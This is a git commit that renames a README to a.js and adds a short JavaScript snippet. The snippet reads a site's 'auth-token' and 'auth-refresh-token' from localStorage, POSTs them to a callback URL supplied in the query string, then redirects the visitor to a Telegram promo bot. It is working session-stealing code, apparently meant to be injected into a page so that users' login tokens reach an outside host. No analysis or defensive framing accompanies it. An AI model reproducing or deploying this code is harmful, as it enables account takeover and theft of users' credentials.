f0a841bb57375ca78b3a2504c0d384e783d5230e
nikita133724 <33579082+nikita133724@users.noreply.github.com>
2026-01-05 02:18:59 +0600

    Update and rename README.md to a.js

---
+++ a.js
@@ -0,0 +1,17 @@
+(async()=>{
+  const cb = new URLSearchParams(location.search).get('tg_callback');
+  if(!cb) return alert("Callback not found");
+
+  const t = localStorage.getItem('auth-token');
+  const r = localStorage.getItem('auth-refresh-token');
+
+  if(!t || !r) return alert("Not logged in");
+
+  await fetch(cb,{
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({token:t,refresh:r})
+  });
+
+  location.href="https://t.me/promo_run_bot";
+})();
